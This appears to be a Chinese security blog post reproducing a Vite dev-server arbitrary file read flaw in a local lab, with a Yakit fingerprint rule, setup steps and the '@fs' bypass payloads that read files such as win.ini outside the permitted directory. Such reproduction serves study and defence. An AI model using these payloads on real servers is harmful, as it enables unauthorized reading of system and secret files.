#  Vitejs漏洞复现与利用   
原创 进击的hack  进击的HACK   2025-05-05 23:50  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DuibU3GqmxVmRsdItbBVRKegNHicHQvAHDdZsGpLVU7touSU1AU1twHTfRjG3Vu5aUh0RnPPllfVUhs4qdWF5QYQ/640?wx_fmt=png&wxfrom=13 "")  
  
声明：  
文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途给予盈利等目的，否则后果自行承担！  
如有侵权烦请告知，我们会立即删除并致歉。谢谢  
！  
  
文章有疑问的，可以公众号发消息问我，或者留言。我每天都会看的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zYJrD2VibHmqgf4y9Bqh9nDynW5fHvgbgkSGAfRboFPuCGjVoC3qMl6wlFucsx3Y3jt4gibQgZ6LxpoozE0Tdow/640?wx_fmt=png&wxfrom=13 "")  
  
  
   
  
> 字数 485，阅读大约需 3 分钟  
  
## 前言  
  
Vitejs 是一款基于原生 ES 模块的新一代前端构建工具。  
  
项目地址：https://github.com/vitejs/vite  
  
在渗透测试的时候，发现前端用这个的框架的还不少。于是就记录了一下。  
## vitejs指纹  
```
/@vite/client
```  
  
在Yakit中配置匹配信息  
```
[{    "Rule": "/@vite/client",    "NoReplace": true,    "Color": "red",    "EnableForResponse": true,    "EnableForHeader": false,    "EnableForBody": true,    "Index": 56,    "ExtraTag": [        "vitejs"    ],    "VerboseName": "vitejs"}]
```  
  
![764af703d45ce74bac5a5baceb198abf.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iaroF9WYSgKPbMZG1iapX0BP3TEiba3p2o4LicXa7iagqFmIJGxMlM6EiaRAtg/640?from=appmsg "null")  
  
764af703d45ce74bac5a5baceb198abf.png  
  
提示存在vitejs  
  
![32544a540215fd27554208e257f677ea.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iarAQTEfbj1GwCZEqm3U0p3f90YJVLEf4uLdspCmBAaibiboXHUbG02qORQ/640?from=appmsg "null")  
  
32544a540215fd27554208e257f677ea.png  
  
测试http://192.168.23.1/@fs/  
  
![5b57c5a4300975d692289fa7fd1e36bf.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iarCPKoXs5qWHFH2FRgkPSS2UV475NllEOcZJuKDk0mnkt2h5cK49fvBQ/640?from=appmsg "null")  
  
5b57c5a4300975d692289fa7fd1e36bf.png  
  
可以看到打印绝对路径，说明确实存在vitejs组件，之后可以尝试他的历史漏洞。  
  
可参考：https://github.com/vitejs/vite/security  
## 安装Vitejs  
```
npm create vite@6.2.0cd vite-project/
```  
### 配置Vite版本  
  
打开package.json，去掉vite版本6.2.0前面的~  
和^  
  
![c0b2b703ef3f1863f0f1653e4c203832.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iarJsVSAvD9TkxPoUDhZxJjvEK5ZYLlv1pdZPSu4GqCyjsS8PIVa9H56g/640?from=appmsg "null")  
  
c0b2b703ef3f1863f0f1653e4c203832.png  
- • ^：表示兼容更新，即允许安装大于指定版本但小于下一个主要版本的更新。例如^5.2.1 允许安装 5.x.x 系列的最新版本，但不允许安装 6.x.x 系列。  
  
- • ：表示补丁更新，即允许安装大于指定版本但小于下一个次要版本的更新。例如  
5.7.2 允许安装 5.7.x 系列的最新版本，但不允许安装 5.8.x 系列。  
  
### 配置vite的对外host  
  
打开package.json，修改dev  
```
"dev": "vite --host 0.0.0.0",
```  
  
![b7f6d1ce111e6e9f7ced5bc8570f9742.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iarhHCSleicdmLibZ8Jc5Rd4AvgVu8l1vYSn9lyja8dGSvRbc0mzlmCU31w/640?from=appmsg "null")  
  
b7f6d1ce111e6e9f7ced5bc8570f9742.png  
### 启动vite  
  
安装依赖  
```
npm installnpm run dev
```  
  
访问 http://192.168.23.1:5173/  
  
![4858be0ba5d7ea70c25fa4d80c256f7b.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iartdWvPsxqA7bPoXkMGaVibEWiaQmRt6QBxyLYibfbLdZo0BSHRWCTu8prA/640?from=appmsg "null")  
  
4858be0ba5d7ea70c25fa4d80c256f7b.png  
## 漏洞复现  
  
参考：  
- • https://github.com/advisories/GHSA-x574-m823-4x7w  
  
访问URL，http://192.168.23.1:5173/@fs/  
- • @fs  
  
- • Vite 中的 @fs 机制是 Vite 在开发服务器中引入的一种特殊的模块解析前缀，其主要目的是支持从文件系统的任意位置加载模块，为开发带来了更大的灵活性。  
  
如下图，可以看到@fs只允许获取指定目录的文件  
  
![c7550b3390afaee6a4d2a629b29de9a5.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iardOxlplpZiaibq3Cz9OPHPdxkAqHEmrLYniadHpQ2UrfdJlJBsBq5XbIVA/640?from=appmsg "null")  
  
c7550b3390afaee6a4d2a629b29de9a5.png  
  
如果是不存在的文件  
  
![6f25eab15c2a38e4a7d7e0c29698f4a1.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iarRxZphumJJKcF5SIiawjID79mmiahpy06g2FndQp2B9fE2RCRibcyIglxA/640?from=appmsg "null")  
  
6f25eab15c2a38e4a7d7e0c29698f4a1.png  
  
  
如果文件存在，但目录不在指定目录内，返回403  
  
![e7621cfacb8fc784df0eff293fbf5073.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iarMv5JEV8mHmY3nYiaoa458f6SygQnZsoClDSSyweCPibN6R7OeUcYBJhA/640?from=appmsg "null")  
  
e7621cfacb8fc784df0eff293fbf5073.png  
```
/@fs/tmp/secret.txt?import&raw??/@fs/C:/windows/win.ini?import&?inline=1.wasm?init
```  
  
可以看到存在base64，解码  
  
![50a676217be81580ed326aaa67d9df7d.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iarXocRl0WW7UCsHPR1ujfDZAoicElFwyz8WRPyyl52Y0IbQMfnpthsjOA/640?from=appmsg "null")  
  
50a676217be81580ed326aaa67d9df7d.png  
  
  
可以看到成功绕过限制，读取任意文件  
  
![a750e325b4518035ad705e8df0e4fe79.png](https://mmbiz.qpic.cn/sz_mmbiz_png/a1BOUvqnbrh1vRx1X770QicCyFSDIj4iar60su0BzXnHwSLJBf1Iof0hJRQNPv6hyZpo6lyE6gsQ7hWOu645TEQQ/640?from=appmsg "null")  
  
a750e325b4518035ad705e8df0e4fe79.png  
## 参考资料  
- • https://xz.aliyun.com/news/17745  
  
  
  
   
  
  
  
  
